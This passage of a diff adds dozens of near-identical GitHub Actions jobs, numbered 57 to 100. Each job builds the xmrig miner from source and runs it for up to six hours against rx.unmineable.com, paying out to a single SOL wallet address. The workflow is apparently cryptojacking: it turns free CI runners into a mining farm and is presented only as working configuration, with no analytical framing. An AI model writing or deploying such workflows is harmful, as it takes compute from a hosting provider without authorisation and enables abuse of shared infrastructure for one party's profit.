+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 57
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker57 -p x --threads=4
+  miner58:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 58
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker58 -p x --threads=4
+  miner59:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 59
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker59 -p x --threads=4
+  miner60:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 60
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker60 -p x --threads=4
+  miner61:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 61
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker61 -p x --threads=4
+  miner62:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 62
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker62 -p x --threads=4
+  miner63:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 63
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker63 -p x --threads=4
+  miner64:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 64
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker64 -p x --threads=4
+  miner65:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 65
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker65 -p x --threads=4
+  miner66:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 66
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker66 -p x --threads=4
+  miner67:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 67
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker67 -p x --threads=4
+  miner68:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 68
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker68 -p x --threads=4
+  miner69:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 69
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker69 -p x --threads=4
+  miner70:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 70
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker70 -p x --threads=4
+  miner71:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 71
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker71 -p x --threads=4
+  miner72:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 72
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker72 -p x --threads=4
+  miner73:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 73
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker73 -p x --threads=4
+  miner74:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 74
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker74 -p x --threads=4
+  miner75:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 75
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker75 -p x --threads=4
+  miner76:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 76
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker76 -p x --threads=4
+  miner77:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 77
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker77 -p x --threads=4
+  miner78:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 78
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker78 -p x --threads=4
+  miner79:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 79
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker79 -p x --threads=4
+  miner80:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 80
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker80 -p x --threads=4
+  miner81:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 81
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker81 -p x --threads=4
+  miner82:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 82
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker82 -p x --threads=4
+  miner83:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 83
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker83 -p x --threads=4
+  miner84:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 84
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker84 -p x --threads=4
+  miner85:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 85
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker85 -p x --threads=4
+  miner86:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 86
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker86 -p x --threads=4
+  miner87:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 87
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker87 -p x --threads=4
+  miner88:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 88
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker88 -p x --threads=4
+  miner89:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 89
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker89 -p x --threads=4
+  miner90:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 90
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker90 -p x --threads=4
+  miner91:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 91
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker91 -p x --threads=4
+  miner92:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 92
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker92 -p x --threads=4
+  miner93:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 93
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker93 -p x --threads=4
+  miner94:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 94
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker94 -p x --threads=4
+  miner95:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 95
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker95 -p x --threads=4
+  miner96:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 96
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker96 -p x --threads=4
+  miner97:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 97
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker97 -p x --threads=4
+  miner98:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 98
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker98 -p x --threads=4
+  miner99:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 99
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker99 -p x --threads=4
+  miner100:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Start Miner 100
+        run: |
+          sudo apt update
+          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker100 -p x --threads=4
